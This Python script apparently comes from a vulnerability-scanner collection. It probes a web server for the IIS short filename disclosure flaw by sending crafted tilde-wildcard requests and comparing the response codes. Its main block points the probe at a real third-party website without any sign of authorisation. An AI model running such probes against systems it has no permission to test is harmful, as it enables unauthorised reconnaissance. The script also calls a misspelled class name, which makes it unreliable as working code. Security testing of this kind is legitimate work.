#!/usr/bin/env python3

'''
name: IIS短文件名漏洞
description: IIS短文件名漏洞
'''

from app.lib.utils.request import request


class Iis_Shortfilename_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
       }
       
    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        url1_400 = self.url + "/san1e*~1****/a.aspx"
        url1_404 = self.url + "/*~1****/a.aspx"
        try:
            req_400 = request.get(url1_400, headers = self.headers)
            req_404 = request.get(url1_404, headers = self.headers)
            if req_400.status_code == 400 and req_404.status_code == 404:
                result = "exists IIS short filename vuln"
                print('存在IIS短文件名漏洞')
                return True
            else:
                print('不存在IIS短文件名漏洞')
                return False
        except Exception as e:
            print(e)
            print('不存在IIS短文件名漏洞')
            return False
        finally:
            pass

if  __name__ == "__main__":
    IIS_Shortfilename = IIS_Shortfilename_BaseVerify('https://blog.csdn.net')
    IIS_Shortfilename.run()